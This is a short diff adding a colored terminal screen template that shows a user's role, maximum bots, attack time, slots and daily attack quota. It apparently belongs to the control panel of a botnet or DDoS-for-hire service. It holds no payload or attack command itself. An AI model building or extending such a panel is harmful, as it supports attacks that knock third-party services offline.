@@ -1,0 +1,9 @@
+\033[2J\033[H\033[38;5;231m
+ User Information\x1b[38;5;160m:\r
+\033[38;5;231m  Username      \x1b[38;5;160m:\033[38;5;231m {username}\r
+\033[38;5;231m  Role          \x1b[38;5;160m:\033[38;5;231m {role}\r
+\033[38;5;231m  Max Time      \x1b[38;5;160m:\033[38;5;231m {max_time}\r
+\033[38;5;231m  Max Bots      \x1b[38;5;160m:\033[38;5;231m {max_bots}\r
+\033[38;5;231m  Max Slots     \x1b[38;5;160m:\033[38;5;231m {max_slots}\r
+\033[38;5;231m  Daily Attacks \x1b[38;5;160m:\033[38;5;231m {daily_used}/{daily_limit}\r
+\033[0m
